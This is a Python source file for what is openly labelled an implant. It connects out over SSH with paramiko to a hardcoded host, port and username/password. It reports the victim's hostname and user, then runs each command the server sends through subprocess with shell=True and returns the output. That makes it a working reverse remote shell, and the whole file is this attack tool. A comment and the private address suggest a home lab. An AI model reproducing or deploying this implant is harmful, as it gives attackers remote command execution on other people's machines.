import os
import socket
import paramiko
import subprocess
import sys
import shlex
import getpass



def SSH_comm():
    ip = '192.168.56.1'
    #this should be the ip adddresswhere theserver is located... in this case my machne
    port = 3535
    username = "admin123"
    password = "pass123"
    SSH = paramiko.SSHClient()
    SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    SSH.connect(ip, port=port, username=username, password=password, banner_timeout=500)
    #open session between client and server



    open_SSH_Session = SSH.get_transport().open_session()
    host_name = socket.gethostname()
    cur_user = getpass.getuser()
    if open_SSH_Session.active:
        open_SSH_Session.send(f'Implant checked in from {host_name} as {cur_user}. \n')
        print(open_SSH_Session.recv(1024).decode())
        while True:
            command = open_SSH_Session.recv(1024)
            try:
                SSH_comm = command.decode()
                if SSH_comm == 'exit':
                    sys.exit()
                if SSH_comm.split(" ")[0] == 'cd':
                    path = SSH_comm.split(" ")[1]
                    os.chdir(path)
                    curdir =os.getcwd()
                    SSH_comm_output = subprocess.check_output(shlex.split(SSH_comm), stderr=subprocess.STDOUT, shell=True)
                    open_SSH_Session.send(f'{curdir}')
                else: 
                    SSH_comm_output = subprocess.check_output(shlex.split(SSH_comm), stderr=subprocess.STDOUT, shell=True)
                    open_SSH_Session.send(SSH_comm_output)
            except Exception as e:
                open_SSH_Session.send(' ') 
            except KeyboardInterrupt:
                except_command = "Session Interupted."
                open_SSH_Session.send(except_command)
                quit()
    return 


if __name__ == "__main__":
    SSH_comm()
